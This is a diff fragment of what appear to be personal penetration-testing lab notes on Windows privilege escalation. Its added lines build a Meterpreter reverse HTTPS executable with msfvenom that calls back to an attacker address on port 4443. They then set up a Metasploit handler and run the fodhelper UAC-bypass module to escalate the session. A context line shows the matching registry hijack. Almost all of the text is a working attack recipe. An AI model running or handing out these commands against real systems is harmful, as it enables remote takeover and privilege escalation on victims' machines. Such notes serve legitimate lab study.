@@ -4,4 +4,31 @@ New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Na
 
 C:\Windows\System32\fodhelper.exe
 
+# Create reverse shell 
+sudo msfvenom -p windows/x64/meterpreter/reverse_https  LHOST=192.168.45.220 LPORT=4443 -f exe -o /home/kali/data/shell2.exe
+
+# Using samba copy it to widnows
+
+msf6> use multi/handeler
+msf6> set payload windows/x64/meterpreter/reverse_https
+msf6> set lhost 192.168.45.220
+msf6> set lport 4443
+msf6> exploit -j
+
+# After we get reverse shell on port 4443 we need to set new payload
+msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper
+msf6 exploit(multi/handler) > set target 1
+msf6 exploit(multi/handler) > set session 1
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+msf6> set lhost 192.168.45.220
+msf6> set lport 444
+msf6> exploit
+
+The payload will be detected by AV
+
+
+
+
+
+
 
